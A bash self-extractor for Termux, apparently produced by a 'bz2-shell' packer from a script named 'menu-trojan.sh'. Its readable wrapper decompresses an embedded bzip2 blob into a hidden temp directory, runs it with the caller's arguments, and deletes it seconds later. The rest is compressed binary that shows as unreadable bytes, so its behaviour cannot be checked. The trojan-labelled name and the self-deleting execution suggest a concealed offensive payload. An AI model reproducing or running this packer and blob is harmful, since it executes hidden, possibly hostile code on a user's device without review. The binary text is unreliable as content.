#!/data/data/com.termux/files/usr/bin/bash
#
# Encrypted by Rangga Fajar Oktariansyah (Anak Gabut Thea)
#
# This file has been encrypted with BZip2 Shell Exec <https://github.com/FajarKim/bz2-shell>
# The filename 'menu-trojan.sh' encrypted at Sat Aug  5 23:25:14 WIB 2023
# I try invoking the compressed executable with the original name
# (for programs looking at their name).  We also try to retain the original
# file permissions on the compressed file.  For safety reasons, bzsh will
# not create setuid or setgid shell scripts.
#
# WARNING: the first line of this file must be either : or #!/bin/bash
# The : is required for some old versions of csh.
# On Ultrix, /bin/bash is too buggy, change the first line to: #!/bin/bash5
#
# Don't forget to follow me on <https://github.com/FajarKim>
skip=76
set -e

tab='	'
nl='
'
IFS=" $tab$nl"

# Make sure important variables exist if not already defined
# $USER is defined by login(1) which is not always executed (e.g. containers)
# POSIX: https://pubs.opengroup.org/onlinepubs/009695299/utilities/id.html
USER=${USER:-$(id -u -n)}
# $HOME is defined at the time of login, but it could be unset. If it is unset,
# a tilde by itself (~) will not be expanded to the current user's home directory.
# POSIX: https://pubs.opengroup.org/onlinepubs/009696899/basedefs/xbd_chap08.html#tag_08_03
HOME="${HOME:-$(getent passwd $USER 2>/dev/null | cut -d: -f6)}"
# macOS does not have getent, but this works even if $HOME is unset
HOME="${HOME:-$(eval echo ~$USER)}"
umask=`umask`
umask 77

bztmpdir=
trap 'res=$?
  test -n "$bztmpdir" && rm -fr "$bztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | */tmp/) test -d "$TMPDIR" && test -w "$TMPDIR" && test -x "$TMPDIR" || TMPDIR=$HOME/.cache/; test -d "$HOME/.cache" && test -w "$HOME/.cache" && test -x "$HOME/.cache" || mkdir "$HOME/.cache";;
  */tmp) TMPDIR=$TMPDIR/; test -d "$TMPDIR" && test -w "$TMPDIR" && test -x "$TMPDIR" || TMPDIR=$HOME/.cache/; test -d "$HOME/.cache" && test -w "$HOME/.cache" && test -x "$HOME/.cache" || mkdir "$HOME/.cache";;
  *:* | *) TMPDIR=$HOME/.cache/; test -d "$HOME/.cache" && test -w "$HOME/.cache" && test -x "$HOME/.cache" || mkdir "$HOME/.cache";;
esac
if type mktemp >/dev/null 2>&1; then
  bztmpdir=`mktemp -d "${TMPDIR}bztmpXXXXXXXXX"`
else
  bztmpdir=${TMPDIR}bztmp$$; mkdir $bztmpdir
fi || { (exit 127); exit 127; }

bztmp=$bztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$bztmp" && rm -r "$bztmp";;
*/*) bztmp=$bztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | bzip2 -cd > "$bztmp"; then
  umask $umask
  chmod 700 "$bztmp"
  (sleep 5; rm -fr "$bztmpdir") 2>/dev/null &
  "$bztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "Cannot decompress ${0##*/}"
  printf >&2 '%s\n' "Report bugs to <fajarrkim@gmail.com>."
  (exit 127); res=127
fi; exit $res
BZh91AY&SY.�AB �����@ �����������a��  @ � `Ϛ� +A��I B��P�h�(#�
= �z�1���M4�h�h  	$&SѤ5�꟔O)�=L�h��h�G��P�� ��      �       �      d       @�     2         �!"d� jd���i�F�5!���h�h�ɐ 
�"(GPNY}��Q�D�)Ƨ�$q�>�\ȵe3���ivi�|�+>C�H����KUуP�h��S���1����6��·0Y�u;RU�LB�X����(�ė�+RٖM�L�3"�%c/�ݖF�U����2�j@� 5lM���� �1AN0)�K�3΍��9I$�0�K�+K`|�`�Taa����(�A6о��?�/�T��h`�
e�$��R�� 4�އwի��ԫ(�څQ?������tv"�x6S}V}jx���������gp��+(!���3\�s������0����ɗ���bF�O��8s�z�ќ
�m���&K���ڻ�f(+F^���鞢&��Lw7��}�e����1<�']>XmT�!���]����p�����:.�l���`f�SƼ/AEn:^�R�`bA-��93�M��>��o���#�F�J���+N�-�{,vv�b/���3�#�QU�uZ���J���HE�;d��Jw��ū�g����Xf���*蕏����
G ����ߓ6�}�*Kn^<�,�4�:��H�y��A���E�(mE7Nr-k'�w$q�,E
�=)��S\�)�� H^Tp�B�� �)	�APf,$S��cI��	?pk������J`�GQ��Z���4.�����D&'c!��	��#�`Z� q��.K@ţ*��z�;a���|Za���:E�2��蝳
1��#�F�� ��2Ѯ���˅Z��v�;����m26!��쵉�¿� ��1��X�.���"PlH�}>��������;��NA�����s¥2���8^9�����*��<��`���xP5��oh	4����/���]�l(l��<���8�B�N%O����:"���	�|	�W����Z=�!���}����3𦤜��GnA���Y�E6q�؀��$^r�A���#�uu��)�@�J���_���*�� 4�~�����C����wN�b���E����p��" �H'���-gg��L�!@�N���]�:P�&>�&)�*��l��Ѱ��w�6�[y�� ��WŠ*Z�By�� �AdW,�&�WY	S���6���
P�C��}R��E���A	�L� i<|rK^����t�H����Zx1T��ws w(@�zʰ;�=皺b��ƽ.�#[�c���(c��_"�0ϷAkT�T�ς��*$���3�>-�53bt,}I%;6��e�WaDXXL�7��<��UjIo�%�dV6�sIsᩈbO��2�_#S(
Q��ٷE�Z�mZ�^B�)˺�#c�Ă0���
Z;?�d�e��O;���/�����9�� *Gx�	1��֔���b�(l`!���D���g�@�u�i4�`#�p�����
�b<d�q���p^Y���w��k�+8.�c<���@ł,IpL�~KtEpΔvV̲{km0ߪ=��y4 =�E���ݍe{�D{�=��Q�"�������p'��|�����k��w]���&�>S�-X�C�H �`��&�@ex)2$
�h-�T+0�D���FT�p��J-���}~��'_����>��$l�� 㡈|��;��Vz�g`<A�(�la�Ds�n�n���uV�ј�@���W�fD�>� *+Z���?b�G����d��Ң��1Y�
�6�3ZH�*-�$Z�.���O��ZyD��ys��ʕ�������"��4�'�F�A�>�P+$u��:CD�&<�<0�`��@ �����+���zZ;�c����0���!�0.�ڤ�т�L����I4M�,Җ�s���HG7����Qg�.a�
Ɗ���B삘��ѯ^d�
���*(����18�|���(�}��J������U���fi��8��9R�L���w$"̩��+��!@A�)��aCI�Y`��	5��D@��,��&�Uj��0���U�X��j��묺j,'c��@�BAE� ���M'@:;o�B:�+�l��05�!�Q��:��e��5$t��t������ك��:�A�`��@[�SMqiZ0����˃�t֏4e�>�a�Y�P���A!4H`6�\vJms_��� u�%�*"�u0�\�I�������0!_ ��Jա�Rb2W���؃o(���c�c�I*>�&JO*Z�O�Цw���ᾶ#�h�P�-z�L��\��keB�	�
匰��A\�&�� {�`�A:�#�5Q�	Y]aB���		e&(zZd�F��:�e1���6l`�I�M���΄%]v���)�����i�
����8Ґxda�su�я�8�5�C`�����J..`��s���	eN9sw��.:Oz���m��
��!���BKrD�q��I%0aP(�r�� X��א��HK7�A��V3c�ɜQQ���`9��	�p�Ød��#��s�1��X���d� �@���2K�G����x�?��$���)�wz
